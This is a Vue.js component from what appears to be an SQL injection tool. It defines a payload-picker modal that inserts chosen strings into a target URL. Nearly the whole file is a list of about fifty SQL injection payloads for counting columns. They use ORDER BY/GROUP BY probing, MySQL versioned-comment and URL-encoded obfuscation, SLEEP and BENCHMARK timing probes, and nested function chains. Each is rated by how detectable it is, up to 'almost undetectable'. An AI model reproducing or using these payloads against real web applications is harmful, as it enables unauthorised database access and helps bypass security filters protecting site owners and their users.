<template>
    <!-- Modal -->
    <div class="modal fade" id="columnCountModal" tabindex="-1" aria-labelledby="columnCountModal" aria-hidden="true">
        <div class="modal-dialog modal-dialog-scrollable">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="d-flex flex-column">
                        <h1 class="modal-title fs-5" id="exampleModalLabel">Select Payload</h1>
                        <ul class="p-0 m-0 d-flex flex-column w-100" style="list-style: none; font-size: 0.8rem;">
                            <li class="p-0 m-0 text-success">Green Color: Payload is basic and easy to detect</li>
                            <li class="p-0 m-0 text-warning">Yellow Color: Payload is mid</li>
                            <li class="p-0 m-0 text-danger">Red Color: Payload is almost undetectable</li>
                        </ul>
                    </div>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <div class="d-flex flex-column align-items-start gap-2">
                        <button type="button" class="btn border-light border-1 text-start   " :class="payload.color" style="text-wrap: nowrap;" data-bs-dismiss="modal" aria-label="Close" v-for="(payload, index) in column_count_payloads" @click="addPayloadToTextArea(payload.name)" :key="index">
                            {{ payload.name }}
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>
</template>
<script>
export default {
    data() {
        return {
            column_count_payloads: [
                // Simple ORDER BY dan GROUP BY
                {
					name: "+ORDER+BY+100",
					color: "text-success"
				},  // Basic ORDER BY dengan angka 100
                {
					name: "+GROUP+BY+100",
					color: "text-success"
				},  // Basic GROUP BY dengan angka 100

                // Kombinasi ORDER BY dan GROUP BY dengan beberapa kolom
                {
					name: "+AND+0+ORDER+BY+1,2,3,4,5",
					color: "text-success"
				},  // Mengurutkan berdasarkan beberapa kolom
                {
					name: "+AND+0+GROUP+BY+1,2,3,4,5",
					color: "text-success"
				},  // Mengelompokkan berdasarkan beberapa kolom

                // Variasi MySQL versi komentar
                {
					name: "/*!50000ORDER*/100",
					color: "text-warning"
				},  // Komentar MySQL versi 50000
                {
					name: "/*!50000ORDER/**_**/*/100",
					color: "text-warning"
				},  // Variasi dengan komentar tambahan
                {
					name: "/*!50000GROUP*/100",
					color: "text-warning"
				},  // GROUP BY menggunakan komentar MySQL
                {
					name: "/*!50000GROUP/**_**/*/100",
					color: "text-warning"
				},  // Variasi GROUP BY dengan komentar tambahan
                {
					name: "/*!50000BY*/100",
					color: "text-warning"
				},  // BY dengan komentar MySQL
                {
					name: "/*!50000BY/**_**/*/100",
					color: "text-warning"
				},  // Variasi BY dengan komentar tambahan

                // Payload dengan komentar di antara kata kunci
                {
					name: "/**/ORDER/**/BY/**/100",
					color: "text-warning"
				},  // Komentar inline untuk memecah ORDER BY
                {
					name: "%23%0AORDER%23%0ABY%23%0A100",
					color: "text-warning"
				},  // Encoding komentar sebagai pengganti spasi
                {
					name: "%0AORDER%0ABY%0A100",
					color: "text-warning"
				},  // Encoding newline di antara ORDER BY
                {
					name: "%2f**%2fORDER%2f**%2fBY%2f**%2f100",
					color: "text-warning"
				},  // Encoding menggunakan karakter khusus

                // Kombinasi komentar dan kata kunci
                {
					name: "+/*!order/**/by*/100",
					color: "text-warning"
				},  // ORDER BY dengan komentar MySQL di antaranya
                {
					name: "+ORDER+BY+100+ASC",
					color: "text-warning"
				},  // Menambahkan urutan ASC
                {
					name: "+/*!50000ORDER*/+/*!50000BY*/+100",
					color: "text-warning"
				},  // Kombinasi ORDER dan BY dengan komentar
                {
					name: "+/*!50000GROUP*/+/*!50000BY*/+100",
					color: "text-warning"
				},  // Kombinasi GROUP dan BY dengan komentar

                // Payload dengan fungsi dan operasi matematika
                {
					name: "+AND+MOD(52,12)+/*!50000ORDER*/+BY+100",
					color: "text-warning"
				},  // Fungsi MOD pada ORDER BY
                {
					name: "+AND+MOD(52,12)+/*!50000GROUP*/+BY+100",
					color: "text-warning"
				},  // Fungsi MOD pada GROUP BY
                {
					name: "+AND+MOD(29,9)+/*!50000ORDER/**_**/*/+/*!50000BY/**_**/*/+100",
					color: "text-warning"
				},  // Variasi fungsi MOD
                {
					name: "+AND+MOD(MOD(29,+9),+4)+=+1+/*!50000ORDER*/+/*!50000BY*/+100",
					color: "text-warning"
				},  // Variasi fungsi MOD
                {
					name: "+AND+MOD(MOD(MOD(MOD(MOD(29,+9),+4),+3),+2),+5)%3D1+/*!50000ORDER*/+/*!50000BY*/+100",
					color: "text-danger"
				},  // Variasi fungsi MOD
                {
					name: "+AND+MOD(MOD(MOD(MOD(MOD(29,+9),+4),+3),+2),+FROM_BASE64('NQ=='))+XOR+ASCII('A')+XOR+ASCII('B')%3D1+/*!50000ORDER*/+/*!50000BY*/+100",
					color: "text-danger"
				},  // Variasi fungsi MOD

                // Obfuscasi dengan angka komentar unik
                {
					name: "+/*!12345ORDER*/+/*!12345BY*/100",
					color: "text-warning"
				},  // ORDER BY dengan angka komentar 12345
                {
					name: "+/*!12345GROUP*/BY+100",
					color: "text-warning"
				},  // GROUP BY dengan angka komentar 12345
                {
					name: "+/*!12345ORDER*/+ASC",
					color: "text-warning"
				},  // ORDER dengan ASC dan komentar 12345

                // Variasi NULL dan komentar
                {
					name: "+ORDER+BY+NULL",
					color: "text-success"
				},  // ORDER BY NULL
                {
					name: "+GROUP+BY+NULL",
					color: "text-success"
				},  // GROUP BY NULL
                {
					name: "+/*!50000ORDER*/+/*!50000BY*/NULL",
					color: "text-success"
				},  // Kombinasi ORDER BY NULL dengan komentar

                // Payload debugging dengan fungsi bawaan
                {
					name: "+AND+SLEEP(5)+ORDER+BY+100",
					color: "text-success"
				},  // Fungsi SLEEP untuk debugging
                {
					name: "+AND+BENCHMARK(1000000,MD5(1))+ORDER+BY+100",
					color: "text-warning"
				},  // Fungsi BENCHMARK untuk debugging

                // Variasi kompleks dengan SELECT dan CASE
                {
					name: "+ORDER+BY+(SELECT+1)",
					color: "text-success"
				},  // ORDER BY dengan SELECT
                {
					name: "+GROUP+BY+(SELECT+NULL)",
					color: "text-success"
				},  // GROUP BY dengan SELECT NULL
                {
					name: "+GROUP/**/BY/**/100",
					color: "text-success"
				},  // GROUP BY dengan komentar inline
                {
					name: "+AND+1=1+ORDER+BY+100",
					color: "text-success"
				},  // Payload sederhana dengan perbandingan true
                {
					name: "+AND+(SELECT+1)+ORDER+BY+1,2,3",
					color: "text-warning"
				},  // SELECT dalam kondisi ORDER BY
                {
					name: "+GROUP+BY+(CASE+WHEN+1=1+THEN+100+END)",
					color: "text-warning"
				},  // GROUP BY dengan CASE

                // Obfuscasi dengan encoding dan karakter khusus
                {
					name: "+ORDER+BY+100%23%0A",
					color: "text-success"
				},  // Encoding komentar untuk memecah payload
                {
					name: "+/*!50000GROUP*/%2f**%2fBY%2f**%2f100",
					color: "text-warning"
				},  // Komentar dengan karakter khusus
                {
					name: "+/*!50000ORDER*/100%23",
					color: "text-success"
				},  // ORDER dengan encoding komentar

                // Variasi ASCII dan karakter hexadecimal
                {
					name: "+AND+ASCII('A')=65+ORDER+BY+100",
					color: "text-warning"
				},  // Perbandingan dengan ASCII
                {
					name: "+AND+1=(SELECT+1)+ORDER+BY+100",
					color: "text-warning"
				},  // SELECT dengan perbandingan
                {
					name: "+AND+0x414141=0x414141+ORDER+BY+100",
					color: "text-warning"
				},  // Perbandingan hexadecimal

                // Advanced Extremely Complex Payload - Professionals Only
                {
					name: "+AND+MOD(MOD(MOD(MOD(MOD(CONV('11101',2,CONV('1010',2,CONV('1010',2,CONV('1010',2,CONV('1010',2,10))))),+9),+4),+3),+2),+FROM_BASE64('NQ=='))+XOR+ASCII('A')+XOR+ASCII('B')%3D1+AND+CONCAT(CHAR(82),CHAR(101),CHAR(115),CHAR(117),CHAR(108),CHAR(116),CHAR(58),CHAR(32),HEX(ASCII('C')))+AND+(ASCII('E')^ASCII('F'))%3D0%0A/*!50000OrDer/**_**/*/%0A/*!12345By/**_**/*/%0ACONCAT(char(ord('1')),%0A,char(ord('0')),%0A,char(ord('0')))",
                    color: "text-danger"
                }
            ]
        }
    },
    methods: {
        addPayloadToTextArea(payload) {
            this.$emit('update-url', payload);
        }
    }
}
</script>